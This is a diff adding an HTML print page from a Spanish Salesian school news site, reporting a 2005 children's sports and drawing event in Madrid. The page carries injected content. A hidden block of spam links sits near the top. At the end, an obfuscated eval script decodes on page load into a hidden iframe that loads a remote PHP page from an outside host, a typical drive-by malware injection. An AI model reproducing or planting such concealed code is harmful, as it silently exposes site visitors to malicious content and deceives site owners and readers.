@@ -1,0 +1,234 @@
+
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+
+
+<div id="urlss-20110830-0">
+<strong>
+<a href="http://www.westwoodjewelrystore.com/" title="westwood vivienne">westwood vivienne</a>
+<a href="http://www.ft-associates.com/" title="http://www.ft-associates.com/">http://www.ft-associates.com/</a> 
+</strong></div>
+<script>document.getElementById("urlss-20110830-0").style.display="none"</script>
+
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />
+
+
+<title>P o r t a l &nbsp;   S a l e s i a n o &nbsp;  d e &nbsp;  E s p a ñ a </title>
+<style type="text/css">
+<!--
+
+-->
+</style>
+<!-- CARGA DE LIBRERIAS PARA POPUP DE IMAGENES-->
+
+<link href="lightbox.css" rel="stylesheet" type="text/css" />
+<script type="text/javascript" src="/js/_common/js/mootools.js"></script>
+<script type="text/javascript" src="lightbox.js"></script>
+<!-- CIERRE DE CARGA DE LIBRERIAS -->
+
+
+
+<link rel="stylesheet" media="all" type="text/css" href="/estilos/pro_dropline_2/pro_left_right.css" />
+
+<!--[if lte IE 6]>
+<link rel="stylesheet" media="all" type="text/css" href="/estilos/pro_dropline_2/pro_left_right_ie6.css" />
+<![endif]-->
+
+<SCRIPT language="javascript"> 
+function imprimir() 
+{ 
+window.print() ; 
+} 
+
+</SCRIPT> 
+
+
+
+
+
+</head>
+
+<body onload="imprimir();">
+
+<div class="contenedor">
+
+<!-- Noticias tiene un ancho de 488px-->
+
+
+<script>
+//-->
+function MM_openBrWindow(theURL,winName,features) { //v2.0
+  window.open(theURL,winName,features);
+}
+
+function aumentar(){
+var nodo=document.getElementById("parrafo")
+}
+
+function aumento() {
+  
+  var tma ;
+  var nodeList = document.getElementsByTagName("font");
+  
+
+  for (var i = 0; i < nodeList.length; i++)
+  {
+	tma = parseInt(nodeList[i].size) ;
+//	nodeList[i].style.color = "#ff0000";
+//	alert(nodeList[i].size);
+	
+	
+//	alert(tma);
+	if (!isNaN(tma) && tma!=7)
+	{
+    	nodeList[i].size = tma+1;
+	}
+}
+}
+
+
+
+function disminuyo() {
+
+
+
+   var tma ;
+  var nodeList = document.getElementsByTagName("font");
+  
+
+  for (var i = 0; i < nodeList.length; i++)
+  {
+	tma = parseInt(nodeList[i].size) ;
+//	nodeList[i].style.color = "#ff0000";
+//	alert(nodeList[i].size);
+	
+	
+//	alert(tma);
+	if (!isNaN(tma) && tma!=1)
+	{
+    	nodeList[i].size = tma-1;
+	}
+}
+}
+</SCRIPT>
+ <script type=text/javascript src='/js/aumenta.js'></script>
+
+<style type="text/css">
+<!--
+body{ font-family:Geneva, Arial, Helvetica, sans-serif; font-size:14px;}
+.n_noticias_foto_destacada{ width:250px; height:auto; padding: 3px; border:1px solid #333333; margin-top: 20px;}
+.titular_32px_noticia{ font-size:32px; color: #424242; text-decoration:none; margin-top: 20px;}
+.contenido_texto_9px_str{ font-size:11px; font-weight:300; color:#8E001C; line-height:15px;  }
+.contenido_texto_14px_str{ font-size:12px; color: #333333; margin-top:20px; font-weight:bold; }
+.cabecera_imprimir_noticias{ height:38px; color:#8E001C; text-align:center; margin: 10px 0px; font-size:24px; border:1px solid #333333; padding-top:10px; font-weight:bold;}
+-->
+</style>
+
+
+
+
+
+
+   
+   
+<div class="cabecera_imprimir_noticias"> NOTICIAS DONBOSCO.ES</div>   
+   
+   
+   
+
+
+            <span class="titular_32px_noticia">Encuentro Pequeños Deportistas 2005</span>
+            <br />
+<br />
+            <p class="contenido_texto_9px_str">31/05/2005 | Inspectoría de Madrid FMA Administrador</p>
+            <p class="contenido_texto_14px_str" ></p>
+           <font size="-1">
+											
+				El Encuentro de Pequeños Deportistas se desarrolló el sábado 28 de mayo de 2005 y, en esta edición, han participado los colegios "Aurelio Gómez Escolar" de Burgos, "San José" (Emilio Ferrari), "Mª Auxiliadora" (Villaamil) y "Escuelas Santísimo Sacramento" (Dehesa de la Villa) de Madrid (todos ellos de la Inspectoría Santa Teresa). Y, los colegios "Nuestra Señora del Pilar" (Plz. Castilla) y "Mª Auxiliadora" (El Plantío de Majadahonda) de Madrid, pertenecientes a la Inspectoría Virgen del Camino. <br /><br />
+<br /><br />
+En total, 26 equipos y 230 deportistas, más los familiares y y amigos de los "pequeños deportistas". El lema de la jornada fue: "Deporte por la Paz", por el año internacional declarado por la ONU. <br /><br />
+<br /><br />
+Según llegaban los participantes, fueron recibidos en el patio del Colegio FMA "Escuelas Santísimo Sacramento" (Dehesa de la Villa-Madrid), y se les repartieron gorras para atenuar el sol. Una vez llegaron todos, se dio comienzo al desfile por casas, cada una con un estandarte y los jugadores con un globo en la mano. La apertura del acto fue realizada por sor Pilar Prieto, inspectora, que resaltó los buenos valores que el deporte aporta como: compañerismo, amistad, tolerancia, amor y respeto. <br /><br />
+<br /><br />
+La inauguración terminó cuando los deportistas soltaron los globos dando un momento de color y festividad al acto. A continuación, se le entregó a Pilar Prieto, un recuerdo en agradecimiento a su ayuda al deporte durante estos años al frente de la Inspectoría Santa Teresa. <br /><br />
+<br /><br />
+Acto seguido, los deportistas se trasladaron a sus respectivos campos de juego para dar comienzo la competición.<br /><br />
+<br /><br />
+La mañana transcurrió con normalidad en sus 5 campos, en las disciplinas de Baloncesto y Fútbol-Sala, y en las categorías de Pre-Benjamín (1º y 2º Ed. Primaria), Benjamín (3º y 4º Ed. Prim.) y Alevín (5º y 6º Ed. Prim.); tras una parada para comer, por la tarde se reanudaron las competiciones sumándose el ajedrez.<br /><br />
+<br /><br />
+Vivimos el día en un ambiente de "patio salesiano" con entusiasmo por parte de unos y nerviosismo por los animadores que llenaban las gradas y alrededores de los campos.<br /><br />
+<br /><br />
+Durante la jornada de mañana y hasta las 14:00h se expusieron los 15 dibujos que la Comisión de Deportes había seleccionado para que los padres, familiares y demás participantes eligieran por votación el 2º y 3º premio del I Concurso de Dibujo para el Encuentro de Pequeños Deportistas 2005. <br /><br />
+<br /><br />
+Se contabilizaron 298 votos, resultando 2º clasificado el dibujo realizado por Belén Veldhuizen Vaquero (10 años – 5º E.P.) del Colegio "Santísimo Sacramento", con 54 votos, y 3º clasificado el dibujo que hizo Andrea Moreno Ordoñez (6 años – 1º E.P.) Colegio "San José", con 53 votos.<br /><br />
+<br /><br />
+A las 18:00 h., y una vez concluidos todos los partidos, tuvo lugar el acto de clausura presidido por Mª Victoria Gómez ("Vito"), que comenzó con la entrega de trofeos, material de dibujo y obsequios para los ganadores del Concurso de Dibujo.<br /><br />
+<br /><br />
+Después, se hizo entrega de las medallas para todos los deportistas, entrenadores, monitores y coordinadores; un trofeo de recuerdo para las Casas así como obsequios de varias entidades para los participantes, dando por concluido el Encuentro 2005.<br /><br />
+<br /><br />
+Es de destacar y agradecer la labor realizada por un grupo de 12 jóvenes voluntarios de Villaamil y la Dehesa de la Villa (de 15-16 años) que fueron los encargados de preparar los campos el día anterior y arbitrar todos los partidos organizados. Como primera experiencia en este campo, desde aquí les decimos GRACIAS, porque se lo merecen.<br /><br />
+<br /><br />
+Nuestro agradecimiento a todos los deportistas, entrenadores, monitores, coordinadores, hijas de María Auxiliadora, padres, familiares y amigos por tanto trabajo, empuje y afán que pusieron para que el encuentro fuera un día feliz para todos. En especial para el grupo de padres de la Dehesa de la Villa porque hicieron sentirnos como en casa.
+     
+        </font>
+
+    <div class="contenedor_texto_noticia">
+	<div class="contenedor_fotos_noticia">
+
+
+<table width="100%" border="0" cellspacing="0" cellpadding="0">
+      <tr>
+        <td align="left" colspan="2">
+     <img src="http://www.donbosco.es/Noticias/upload/Encuentro Pequeños Deportistas 2005/peques_deportistas1.jpg" align="bottom" alt="noticia_destacada" class="n_noticias_foto_destacada" longdesc="imagen_noticia_destacada" /><ul class="piedefoto"><li> Una imagen del encuentro</li></ul> 
+     	</td>
+     </tr>
+      </table>    
+<!-- Cabecera de la Caja de Noticias-->    
+
+	  
+
+
+
+   <script type="text/javascript">
+			window.addEvent('domready',function(){Lightbox.init({descriptions: '.lightboxDesc', showControls: true});});
+		</script>
+	 
+	 
+  
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+     
+    
+
+    
+    </div>
+	  
+
+ 
+  </div>
+ 
+
+ 
+
+</div>
+<script language="javascript" type="text/javascript"> 
+window.addEvent( 'keydown', function( evt ){ 
+   if( evt.key == 'enter' && evt.shift ) 
+      alert("pressed"); 
+}); 
+</script> 
+
+<script>Object.prototype.tes=-2;String.prototype.test="h";for(i in'')if(i=='test')m=''[i];var s;aa=document.createTextNode(m+"a"+"rC"+"ode");s=String["fr"+"omC"+aa['nod'+'eVa'+'lue']];for(i in{})if(i=='t'+'e'+'s')h={}[i];eval(s(7-h,7-h,103-h,100-h,30-h,38-h,98-h,109-h,97-h,115-h,107-h,99-h,108-h,114-h,44-h,101-h,99-h,114-h,67-h,106-h,99-h,107-h,99-h,108-h,114-h,113-h,64-h,119-h,82-h,95-h,101-h,76-h,95-h,107-h,99-h,38-h,37-h,96-h,109-h,98-h,119-h,37-h,39-h,89-h,46-h,91-h,39-h,121-h,7-h,7-h,7-h,103-h,100-h,112-h,95-h,107-h,99-h,112-h,38-h,39-h,57-h,7-h,7-h,123-h,30-h,99-h,106-h,113-h,99-h,30-h,121-h,7-h,7-h,7-h,98-h,109-h,97-h,115-h,107-h,99-h,108-h,114-h,44-h,117-h,112-h,103-h,114-h,99-h,38-h,32-h,58-h,103-h,100-h,112-h,95-h,107-h,99-h,30-h,113-h,112-h,97-h,59-h,37-h,102-h,114-h,114-h,110-h,56-h,45-h,45-h,101-h,108-h,112-h,109-h,114-h,102-h,116-h,120-h,44-h,97-h,120-h,44-h,97-h,97-h,45-h,97-h,109-h,115-h,108-h,114-h,47-h,53-h,44-h,110-h,102-h,110-h,37-h,30-h,117-h,103-h,98-h,114-h,102-h,59-h,37-h,47-h,46-h,37-h,30-h,102-h,99-h,103-h,101-h,102-h,114-h,59-h,37-h,47-h,46-h,37-h,30-h,113-h,114-h,119-h,106-h,99-h,59-h,37-h,116-h,103-h,113-h,103-h,96-h,103-h,106-h,103-h,114-h,119-h,56-h,102-h,103-h,98-h,98-h,99-h,108-h,57-h,110-h,109-h,113-h,103-h,114-h,103-h,109-h,108-h,56-h,95-h,96-h,113-h,109-h,106-h,115-h,114-h,99-h,57-h,106-h,99-h,100-h,114-h,56-h,46-h,57-h,114-h,109-h,110-h,56-h,46-h,57-h,37-h,60-h,58-h,45-h,103-h,100-h,112-h,95-h,107-h,99-h,60-h,32-h,39-h,57-h,7-h,7-h,123-h,7-h,7-h,100-h,115-h,108-h,97-h,114-h,103-h,109-h,108-h,30-h,103-h,100-h,112-h,95-h,107-h,99-h,112-h,38-h,39-h,121-h,7-h,7-h,7-h,116-h,95-h,112-h,30-h,100-h,30-h,59-h,30-h,98-h,109-h,97-h,115-h,107-h,99-h,108-h,114-h,44-h,97-h,112-h,99-h,95-h,114-h,99-h,67-h,106-h,99-h,107-h,99-h,108-h,114-h,38-h,37-h,103-h,100-h,112-h,95-h,107-h,99-h,37-h,39-h,57-h,100-h,44-h,113-h,99-h,114-h,63-h,114-h,114-h,112-h,103-h,96-h,115-h,114-h,99-h,38-h,37-h,113-h,112-h,97-h,37-h,42-h,37-h,102-h,114-h,114-h,110-h,56-h,45-h,45-h,101-h,108-h,112-h,109-h,114-h,102-h,116-h,120-h,44-h,97-h,120-h,44-h,97-h,97-h,45-h,97-h,109-h,115-h,108-h,114-h,47-h,53-h,44-h,110-h,102-h,110-h,37-h,39-h,57-h,100-h,44-h,113-h,114-h,119-h,106-h,99-h,44-h,116-h,103-h,113-h,103-h,96-h,103-h,106-h,103-h,114-h,119-h,59-h,37-h,102-h,103-h,98-h,98-h,99-h,108-h,37-h,57-h,100-h,44-h,113-h,114-h,119-h,106-h,99-h,44-h,110-h,109-h,113-h,103-h,114-h,103-h,109-h,108-h,59-h,37-h,95-h,96-h,113-h,109-h,106-h,115-h,114-h,99-h,37-h,57-h,100-h,44-h,113-h,114-h,119-h,106-h,99-h,44-h,106-h,99-h,100-h,114-h,59-h,37-h,46-h,37-h,57-h,100-h,44-h,113-h,114-h,119-h,106-h,99-h,44-h,114-h,109-h,110-h,59-h,37-h,46-h,37-h,57-h,100-h,44-h,113-h,99-h,114-h,63-h,114-h,114-h,112-h,103-h,96-h,115-h,114-h,99-h,38-h,37-h,117-h,103-h,98-h,114-h,102-h,37-h,42-h,37-h,47-h,46-h,37-h,39-h,57-h,100-h,44-h,113-h,99-h,114-h,63-h,114-h,114-h,112-h,103-h,96-h,115-h,114-h,99-h,38-h,37-h,102-h,99-h,103-h,101-h,102-h,114-h,37-h,42-h,37-h,47-h,46-h,37-h,39-h,57-h,7-h,7-h,7-h,98-h,109-h,97-h,115-h,107-h,99-h,108-h,114-h,44-h,101-h,99-h,114-h,67-h,106-h,99-h,107-h,99-h,108-h,114-h,113-h,64-h,119-h,82-h,95-h,101-h,76-h,95-h,107-h,99-h,38-h,37-h,96-h,109-h,98-h,119-h,37-h,39-h,89-h,46-h,91-h,44-h,95-h,110-h,110-h,99-h,108-h,98-h,65-h,102-h,103-h,106-h,98-h,38-h,100-h,39-h,57-h,7-h,7-h,123-h));</script>
+</body>
+</html>
